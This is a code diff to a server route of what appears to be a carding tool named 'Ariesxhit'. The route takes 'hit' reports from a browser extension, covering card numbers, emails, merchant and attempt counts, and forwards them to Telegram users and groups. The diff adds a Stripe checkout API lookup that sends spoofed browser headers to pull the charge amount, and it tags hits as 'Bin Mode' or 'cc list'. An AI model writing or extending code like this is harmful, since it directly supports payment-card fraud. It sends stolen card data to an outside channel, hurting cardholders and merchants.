@@ -716,19 +716,71 @@ router.post('/notify-hit', async (req, res) => {
   // success_url is no longer sent by extension - simplified processing
   console.log('[Telegram] success_url removed from extension payload');
   const cardDisplay = (card && card.trim()) ? card.replace(/\|/g, ' | ') : '—';
-  // Debug logging for card data
-  if (!card || !card.trim()) {
-    console.log('No card data received in hit notification:', { card, attempts, tgId });
-  }
   const emailDisplay = (email && String(email).trim()) || '—';
   const timeDisplay = (time_sec != null && time_sec !== '') ? `${time_sec}s` : '—';
+
+  // For extension hits, try to get amount from checkout URL if available
+  let displayAmount = amtFormatted;
+  if (current_url && current_url.includes('checkout.stripe.com')) {
+    try {
+      console.log('[HIT_NOTIFICATION] Attempting to extract amount from checkout URL for personal message');
+      const parsedUrl = parseCheckoutUrl(current_url);
+      if (parsedUrl.success && parsedUrl.publicKey) {
+        const apiUrl = `https://api.stripe.com/v1/payment_pages/${parsedUrl.sessionId}?key=${parsedUrl.publicKey}&eid=NA`;
+
+        const response = await new Promise((resolve, reject) => {
+          const request = https.get(apiUrl, {
+            headers: {
+              'accept': 'application/json',
+              'accept-language': 'en',
+              'cache-control': 'no-cache',
+              'content-type': 'application/x-www-form-urlencoded',
+              'origin': 'https://checkout.stripe.com',
+              'referer': 'https://checkout.stripe.com/',
+              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            timeout: 15000
+          }, (res) => {
+            let data = '';
+            res.on('data', (chunk) => data += chunk);
+            res.on('end', () => {
+              try {
+                resolve({ status: res.statusCode, data: JSON.parse(data) });
+              } catch (e) {
+                resolve({ status: res.statusCode, data: null, error: e.message });
+              }
+            });
+          });
+          request.on('error', (error) => reject(error));
+          request.on('timeout', () => {
+            request.destroy();
+            reject(new Error('Timeout'));
+          });
+        });
+
+        if (response.status === 200 && response.data) {
+          // Extract amount from checkout session
+          if (response.data.currency && response.data.amount_total) {
+            const currency = response.data.currency.toUpperCase();
+            const amountCents = response.data.amount_total;
+            const amountDollars = (amountCents / 100).toFixed(2);
+            displayAmount = `$${amountDollars}`;
+            console.log('[HIT_NOTIFICATION] ✅ Extracted amount for personal message:', displayAmount);
+          }
+        }
+      }
+    } catch (error) {
+      console.error('[HIT_NOTIFICATION] ❌ Error extracting amount for personal message:', error.message);
+    }
+  }
+
   const hitText = `🎯 <b>HIT DETECTED</b>\n` +
     `─────────────────\n\n` +
     `Card :- ${cardDisplay}\n` +
     `Email :- ${emailDisplay}\n` +
     `Merchant :- ${merchantName}\n` +
     `Attempt :- ${attempts ?? '—'}\n` +
-    `Amount :- ${amtFormatted}\n` +
+    `Amount :- ${displayAmount}\n` +
     `Time :- ${timeDisplay}\n\n` +
     `Thanks For Using Ariesxhit. ❤️`;
   console.log('[HIT_NOTIFICATION] Sending notification to Telegram user:', tgId);
@@ -746,12 +798,23 @@ router.post('/notify-hit', async (req, res) => {
   console.log('[HIT_NOTIFICATION] Attempting group notifications regardless of user message status');
 
   const cleanCard = cardDisplay !== '—' ? cardDisplay.replace(' | ', '').replace(/\s/g, '') : '';
+
+  // Determine BIN mode: if card data is exactly 6 digits (BIN only), it's BIN mode
+  // If it has more data (like full card), it's CC list mode
+  let binMode = '(extension hit)';
+  if (cleanCard && cleanCard.length === 6 && /^\d{6}$/.test(cleanCard)) {
+    binMode = '(Bin Mode)';
+  } else if (cleanCard && cleanCard.length > 6) {
+    binMode = '(cc list)';
+  }
+
   const hitData = {
     userId: tgId,
     userName: userName,
     card: cleanCard || 'Unknown',
     bin: cleanCard ? extractBinFromCard(cleanCard) : 'Unknown',
-    binMode: '(extension hit)',
+    binMode: binMode,
+    email: emailDisplay !== '—' ? emailDisplay : null,
     amount: amtFormatted === 'Free Trial' ? '0.00' : amtFormatted.replace('₹', '').replace(/[^\d.]/g, ''),
     attempts: attempts || 1,
     timeTaken: timeDisplay,
